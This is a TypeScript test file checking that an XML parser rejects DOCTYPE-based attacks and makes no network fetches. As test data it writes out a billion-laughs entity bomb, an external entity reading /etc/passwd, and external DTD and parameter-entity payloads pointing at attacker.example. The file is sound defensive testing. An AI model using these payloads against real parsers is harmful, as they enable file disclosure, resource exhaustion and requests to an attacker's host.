import { afterEach, beforeEach, describe, expect, test, vi } from 'vitest';
import { DEFAULT_LIMITS } from '../../src/limits';
import { parseXml, xmlContext } from '../../src/xml/parse';
import { catchError } from '../helpers/catch-error';
import { encode } from '../helpers/encode';

// R5.1, R5.2, R5.7: the XML attack set. Every document with a DOCTYPE is refused before the
// parser runs, and nothing is fetched.

const parse = (text: string) =>
  parseXml(encode(text, 'utf-8'), 'manifest.xsf', xmlContext(DEFAULT_LIMITS));

const network = { fetch: vi.fn(), xhr: vi.fn() };

beforeEach(() => {
  network.fetch = vi.fn(() => {
    throw new Error('fetch called');
  });
  network.xhr = vi.fn(() => {
    throw new Error('XMLHttpRequest called');
  });
  vi.stubGlobal('fetch', network.fetch);
  vi.stubGlobal('XMLHttpRequest', network.xhr);
});

afterEach(() => {
  vi.unstubAllGlobals();
  expect(network.fetch).not.toHaveBeenCalled();
  expect(network.xhr).not.toHaveBeenCalled();
});

const attacks: [string, string][] = [
  [
    'billion laughs',
    `<?xml version="1.0"?>
<!DOCTYPE lolz [
 <!ENTITY lol "lol">
 <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
 <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
 <!ENTITY lol9 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
]>
<lolz>&lol9;</lolz>`,
  ],
  [
    'external entity file:///etc/passwd',
    '<?xml version="1.0"?>\n<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>\n<r>&xxe;</r>',
  ],
  [
    'external DTD',
    '<?xml version="1.0"?>\n<!DOCTYPE r SYSTEM "http://attacker.example/evil.dtd">\n<r/>',
  ],
  [
    'parameter entity',
    '<?xml version="1.0"?>\n<!DOCTYPE r [<!ENTITY % p SYSTEM "http://attacker.example/p.dtd"> %p;]>\n<r/>',
  ],
];

describe('every DOCTYPE attack is UNSAFE_XML at the DOCTYPE', () => {
  test.each(attacks)('%s', (_name, text) => {
    expect(catchError(() => parse(text))).toMatchObject({
      code: 'UNSAFE_XML',
      details: { file: 'manifest.xsf', line: 2, column: 1 },
    });
  });
});

describe('without a DOCTYPE', () => {
  test('an entity reference is never expanded: INVALID_XML', () => {
    expect(catchError(() => parse('<r>&xxe;</r>')).code).toBe('INVALID_XML');
  });

  test('257 levels of nesting stop with LIMIT_EXCEEDED before the tree is built', () => {
    expect(catchError(() => parse('<a>'.repeat(257) + '</a>'.repeat(257)))).toMatchObject({
      code: 'LIMIT_EXCEEDED',
      details: { limit: 'xmlDepth', observed: 257 },
    });
  });

  test('a schemaLocation or xsi attribute is just text', () => {
    const { root } = parse(
      '<r xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="urn:x http://attacker.example/x.xsd"/>',
    );
    expect(root.attributes.map((a) => a.value)).toEqual(['urn:x http://attacker.example/x.xsd']);
  });
});
